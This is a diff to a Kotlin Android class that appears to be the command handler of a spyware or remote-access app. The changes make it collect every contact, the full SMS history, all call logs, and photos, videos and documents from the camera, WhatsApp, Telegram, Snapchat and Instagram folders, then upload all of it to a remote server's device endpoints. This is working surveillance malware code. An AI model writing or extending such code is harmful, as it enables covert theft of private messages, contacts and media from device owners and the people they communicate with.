@@ -77,7 +77,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     private fun takePhoto(front: Boolean, onDone: (String) -> Unit) {
-        // Stop WebRTC if active (camera conflict fix)
         if (webrtc != null) {
             webrtc?.stop()
             webrtc = null
@@ -172,23 +171,52 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         } catch (e: SecurityException) {}
     }
 
+    // ============ CONTACTS - FULL DATA ============
     fun handleContacts() {
         if (!hasPerm(Manifest.permission.READ_CONTACTS)) return
         val arr = JSONArray()
+
+        // Get ALL contacts with phone numbers - use Phone.CONTENT_URI
         val cur = ctx.contentResolver.query(
-            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            null, null, null,
+            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+        )
+
         cur?.use {
             while (it.moveToNext()) {
-                val ni = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
-                val pi = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
-                if (ni >= 0 && pi >= 0) {
-                    arr.put(JSONObject().apply {
-                        put("name", it.getString(ni))
-                        put("phone", it.getString(pi))
-                    })
+                try {
+                    val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                    val phoneIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                    val typeIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
+                    val emailIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
+
+                    val name = if (nameIdx >= 0) it.getString(nameIdx) ?: "Unknown" else "Unknown"
+                    val phone = if (phoneIdx >= 0) it.getString(phoneIdx) ?: "" else ""
+                    val type = if (typeIdx >= 0) it.getInt(typeIdx) else 0
+                    val contactId = if (emailIdx >= 0) it.getString(emailIdx) ?: "" else ""
+
+                    if (phone.isNotEmpty()) {
+                        arr.put(JSONObject().apply {
+                            put("name", name)
+                            put("phone", phone)
+                            put("type", when(type) {
+                                1 -> "Home"
+                                2 -> "Mobile"
+                                3 -> "Work"
+                                else -> "Other"
+                            })
+                            put("contactId", contactId)
+                        })
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Contact parse err: ${e.message}")
                 }
             }
         }
+
+        Log.d(TAG, "Contacts count: ${arr.length()}")
+
         val json = JSONObject().apply {
             put("deviceId", deviceId)
             put("contacts", arr)
@@ -197,19 +225,56 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         post("${Config.SERVER_URL}/api/device/contacts", json)
     }
 
+    // ============ MESSAGES - FULL HISTORY ============
     private fun handleMessages() {
         if (!hasPerm(Manifest.permission.READ_SMS)) return
         val arr = JSONArray()
-        val cur = ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
+
+        // Get ALL SMS - no limit, sorted by date (newest first)
+        val cur = ctx.contentResolver.query(
+            Telephony.Sms.CONTENT_URI,
+            null, null, null,
+            Telephony.Sms.DATE + " DESC"
+        )
+
         cur?.use {
             while (it.moveToNext()) {
-                arr.put(JSONObject().apply {
-                    put("from", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "Unknown")
-                    put("body", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: "")
-                    put("time", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.DATE)))
-                })
+                try {
+                    val addrIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
+                    val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
+                    val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
+                    val typeIdx = it.getColumnIndex(Telephony.Sms.TYPE)
+                    val readIdx = it.getColumnIndex(Telephony.Sms.READ)
+
+                    val address = if (addrIdx >= 0) it.getString(addrIdx) ?: "Unknown" else "Unknown"
+                    val body = if (bodyIdx >= 0) it.getString(bodyIdx) ?: "" else ""
+                    val date = if (dateIdx >= 0) it.getString(dateIdx) ?: "0" else "0"
+                    val type = if (typeIdx >= 0) it.getInt(typeIdx) else 1
+                    val read = if (readIdx >= 0) it.getInt(readIdx) else 0
+
+                    arr.put(JSONObject().apply {
+                        put("from", address)
+                        put("body", body)
+                        put("time", date)
+                        put("type", when(type) {
+                            1 -> "inbox"
+                            2 -> "sent"
+                            3 -> "draft"
+                            4 -> "outbox"
+                            5 -> "failed"
+                            6 -> "queued"
+                            else -> "unknown"
+                        })
+                        put("read", read == 1)
+                    })
+                } catch (e: Exception) {
+                    Log.e(TAG, "SMS parse err: ${e.message}")
+                }
             }
         }
+
+        Log.d(TAG, "SMS count: ${arr.length()}")
+
         val json = JSONObject().apply {
             put("deviceId", deviceId)
             put("messages", arr)
@@ -218,22 +283,34 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         post("${Config.SERVER_URL}/api/device/messages", json)
     }
 
+    // ============ CALL LOGS - FULL ============
     private fun handleCallLogs() {
         if (!hasPerm(Manifest.permission.READ_CALL_LOG)) return
         val arr = JSONArray()
+
         val cur = ctx.contentResolver.query(
-            CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
+            CallLog.Calls.CONTENT_URI, null, null, null,
+            CallLog.Calls.DATE + " DESC"
+        )
+
         cur?.use {
-            while (it.moveToNext() && arr.length() < 200) {
-                arr.put(JSONObject().apply {
-                    put("number", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)))
-                    put("name", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "Unknown")
-                    put("type", it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE)))
-                    put("duration", it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
-                    put("time", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DATE)))
-                })
+            while (it.moveToNext()) {
+                try {
+                    arr.put(JSONObject().apply {
+                        put("number", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "")
+                        put("name", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "Unknown")
+                        put("type", it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE)))
+                        put("duration", it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
+                        put("time", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DATE)))
+                    })
+                } catch (e: Exception) {
+                    Log.e(TAG, "Call log err: ${e.message}")
+                }
             }
         }
+
+        Log.d(TAG, "Call logs count: ${arr.length()}")
+
         val json = JSONObject().apply {
             put("deviceId", deviceId)
             put("callLogs", arr)
@@ -242,18 +319,58 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         post("${Config.SERVER_URL}/api/device/calllogs", json)
     }
 
+    // ============ FILES - COMPLETE STORAGE SCAN ============
     private fun handleFiles() {
         try {
+            // Complete storage scan - all common locations
             val dirs = listOf(
+                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
+                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                 Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
-                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
+                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
+                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
+                File("/storage/emulated/0/WhatsApp/Media"),
+                File("/storage/emulated/0/Telegram"),
+                File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"),
+                File("/storage/emulated/0/MIUI/Gallery"),
+                File("/storage/emulated/0/Snapchat"),
+                File("/storage/emulated/0/Instagram"),
+                File("/storage/emulated/0/Pictures/Screenshots"),
+                File("/storage/emulated/0/DCIM/Camera"),
+                File("/storage/emulated/0/DCIM/Screenshots"),
+                File("/storage/emulated/0/Download")
             )
+
+            var uploaded = 0
+            var scanned = 0
+            val maxFiles = 500
+
             dirs.forEach { dir ->
-                dir.listFiles()?.take(20)?.forEach { f ->
-                    if (f.isFile && f.length() < 10 * 1024 * 1024) uploadFile(f, "file")
+                if (!dir.exists()) return@forEach
+                try {
+                    dir.walkTopDown().take(maxFiles).forEach { f ->
+                        scanned++
+                        if (f.isFile && f.length() < 20 * 1024 * 1024) {
+                            val ext = f.extension.lowercase()
+                            if (ext in listOf("jpg", "jpeg", "png", "gif", "webp", "mp4", "mov", "3gp", "mkv", "pdf", "doc", "docx")) {
+                                val type = when (ext) {
+                                    "jpg", "jpeg", "png", "gif", "webp" -> "photo"
+                                    "mp4", "mov", "3gp", "mkv" -> "video"
+                                    else -> "file"
+                                }
+                                uploadFile(f, type)
+                                uploaded++
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Dir scan err: ${e.message}")
                 }
             }
-        } catch (_: Exception) {}
+            Log.d(TAG, "Files scanned: $scanned, uploaded: $uploaded")
+        } catch (e: Exception) {
+            Log.e(TAG, "handleFiles err: ${e.message}")
+        }
     }
 
     private fun handleApps() {
